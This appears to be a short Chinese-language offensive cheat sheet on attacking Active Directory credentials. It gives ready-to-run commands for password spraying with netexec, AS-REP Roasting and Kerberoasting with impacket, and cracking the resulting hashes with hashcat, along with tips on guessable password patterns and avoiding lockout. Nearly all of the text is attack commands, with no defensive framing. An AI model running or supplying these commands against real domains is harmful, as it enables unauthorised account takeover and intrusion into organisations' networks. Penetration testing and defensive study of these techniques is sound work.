# AD 域凭据攻击详解

## 密码喷洒

**先查密码策略**：`net accounts /domain` 看锁定阈值和重置时间。
```bash
# 一次只喷一个密码
netexec smb DC_IP -u userlist.txt -p 'Company2024!' --continue-on-success
```
常见密码模式：公司名+年份+符号、季节+年份、Welcome1!

## AS-REP Roasting

针对不需要 Kerberos 预认证的用户（无需凭据即可攻击）：
```bash
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile users.txt -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt wordlist.txt
```

## Kerberoasting

针对注册了 SPN 的服务账户（需要任意域用户凭据）：
```bash
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt wordlist.txt
```
服务账户密码通常比用户密码更弱（设置后很少更改）。
